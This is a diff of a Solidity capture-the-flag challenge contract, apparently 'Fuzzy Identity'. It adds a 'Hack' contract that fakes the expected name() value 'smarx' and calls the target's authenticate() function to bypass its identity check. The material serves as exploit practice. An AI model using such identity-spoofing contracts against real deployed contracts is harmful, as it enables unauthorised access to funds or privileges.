@@ -2,7 +2,7 @@
 pragma solidity ^0.8.0;
 
 interface IName {
-    function name() external view returns (bytes32);
+    function name() external pure returns (bytes32);
 }
 
 contract FuzzyIdentityChallenge {
@@ -15,7 +15,7 @@ contract FuzzyIdentityChallenge {
         isComplete = true;
     }
 
-    function isSmarx(address addr) internal view returns (bool) {
+    function isSmarx(address addr) internal pure returns (bool) {
         return IName(addr).name() == bytes32("smarx");
     }
 
@@ -33,5 +33,21 @@ contract FuzzyIdentityChallenge {
         }
 
         return false;
+    }
+}
+
+contract Hack is IName {
+    FuzzyIdentityChallenge private target;
+
+    constructor(address _target) {
+        target = FuzzyIdentityChallenge(_target);
+    }
+
+    function name() external pure returns (bytes32) {
+        return bytes32("smarx");
+    }
+
+    function attack() public {
+        target.authenticate();
     }
 }
